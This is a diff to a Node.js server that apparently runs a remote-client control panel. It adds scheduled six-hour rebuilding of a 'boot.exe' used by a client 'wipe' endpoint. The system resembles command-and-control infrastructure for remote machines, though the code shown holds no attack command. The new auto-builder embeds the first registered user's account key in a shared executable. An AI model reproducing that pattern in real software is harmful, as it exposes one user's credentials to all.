@@ -421,7 +421,6 @@ app.get('/api/clients/:id/commands', requireAuth, (req, res) => {
   res.json(rows);
 });
 
-// Native Rust process manager polling
 app.get('/api/clients/:id/sysinfo', requireAuth, async (req, res) => {
   const clientId = Number(req.params.id);
   const client = db.prepare(sql`SELECT id FROM clients WHERE id = ? AND user_id = ?`).get(clientId, req.user.uid);
@@ -434,7 +433,7 @@ app.get('/api/clients/:id/sysinfo', requireAuth, async (req, res) => {
     `).run(req.user.uid, clientId, Date.now());
     
     const cmdId = Number(info.lastInsertRowid);
-    const deadline = Date.now() + 10000; // 10s timeout
+    const deadline = Date.now() + 10000; 
 
     while (Date.now() < deadline) {
       await new Promise(r => setTimeout(r, 150));
@@ -468,14 +467,25 @@ app.post('/api/clients/:id/wipe', requireAuth, async (req, res) => {
   if (!client) return res.status(404).json({ error: 'client not found' });
 
   const bootPath = path.join(DOWNLOAD_DIR, 'boot.exe');
-  if (!fs.existsSync(bootPath)) {
+  
+  // Check if missing OR older than 6 hours
+  let needsBuild = !fs.existsSync(bootPath);
+  if (!needsBuild) {
+    const stat = fs.statSync(bootPath);
+    if (Date.now() - stat.mtimeMs > 6 * 60 * 60 * 1000) {
+      needsBuild = true;
+    }
+  }
+
+  if (needsBuild) {
     const row = getOwnUser(req.user.uid);
     const acctKey = row?.account_key || '';
     if (!acctKey) return res.status(400).json({ error: 'no account key to build boot.exe' });
 
     try {
       const bootBuf = await buildBoot({ key: acctKey });
-      fs.writeFileSync(bootPath, bootBuf, { mode: 0o755 });
+      fs.writeFileSync(bootPath + '.tmp', bootBuf, { mode: 0o755 });
+      fs.renameSync(bootPath + '.tmp', bootPath);
     } catch (e) {
       console.error('[wipe] failed to generate boot.exe', e);
       return res.status(500).json({ error: 'failed to generate boot.exe' });
@@ -809,6 +819,43 @@ app.delete('/api/builds/:id', requireAuth, (req, res) => {
 
 app.use('/api', (_req, res) => res.status(404).json({ error: 'not found' }));
 app.use((err, _req, res, _next) => { console.error('[http]', err); res.status(500).json({ error: 'server error' }); });
+
+// ---------- auto builder (every 6 hours) ----------
+const AUTO_BUILD_INTERVAL_MS = 60 * 60 * 1000; // check every hour
+const MAX_AGE_MS = 6 * 60 * 60 * 1000; // rebuild if older than 6h
+
+async function checkAutoBuild() {
+  try {
+    const bootPath = path.join(DOWNLOAD_DIR, 'boot.exe');
+    let needsBuild = false;
+
+    if (!fs.existsSync(bootPath)) {
+      needsBuild = true;
+    } else {
+      const stat = fs.statSync(bootPath);
+      if (Date.now() - stat.mtimeMs > MAX_AGE_MS) {
+        needsBuild = true;
+      }
+    }
+
+    if (needsBuild) {
+      // Use the first user's account key to bake into the global boot.exe
+      const user = db.prepare(sql`SELECT account_key FROM users WHERE account_key IS NOT NULL LIMIT 1`).get();
+      if (!user) return; // no users registered yet
+
+      console.log(`[auto-build] rebuilding boot.exe (older than 6h or missing)...`);
+      const bootBuf = await buildBoot({ key: user.account_key });
+      fs.writeFileSync(bootPath + '.tmp', bootBuf, { mode: 0o755 });
+      fs.renameSync(bootPath + '.tmp', bootPath);
+      console.log(`[auto-build] rebuild complete. size: ${bootBuf.length}`);
+    }
+  } catch (e) {
+    console.error('[auto-build] failed:', e.message);
+  }
+}
+
+setInterval(checkAutoBuild, AUTO_BUILD_INTERVAL_MS);
+setTimeout(checkAutoBuild, 10_000); // Also run 10 seconds after startup
 
 const udpSock = startUdp({
   host: CFG.bindHost, port: CFG.udpPort,
